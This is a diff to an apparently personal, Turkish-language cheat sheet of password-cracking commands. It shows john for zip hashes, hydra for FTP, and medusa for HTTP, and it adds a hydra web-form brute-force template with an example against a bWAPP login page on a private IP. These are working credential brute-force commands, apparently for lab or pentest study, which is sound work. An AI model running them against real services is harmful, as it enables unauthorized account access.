@@ -20,7 +20,11 @@ zip2john encrypted.zip > encrypted.hash$ : hashi çıkar
 john --show encrypted.hash : hashi kır.
 
 *hydra
+SYSTEM : 
 hydra -l user -P passlist.txt ftp://192.168.0.1
+WEB : 
+hydra <target ip> <http metod posty yada get> "<login işleminin gerçekleştiği path>:<html formunda gönderilen username name>:^USER^&<html formunda gönderilen şifre name>:^PASS^&form=<buton html name>:<sayfada elde edilen hata mesajı"> -L <username wordlisti> -P <şifre wordlisti>
+Örnek = hydra 10.10.10.1 http-form-post "BWAPP/login.php:login=^USER^&password=^PASS^&form=submit:invalid credential" -L worlist.txt -P wordlist.txt
 
 *Medusa
 medusa -h <targetip> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/test -T 10
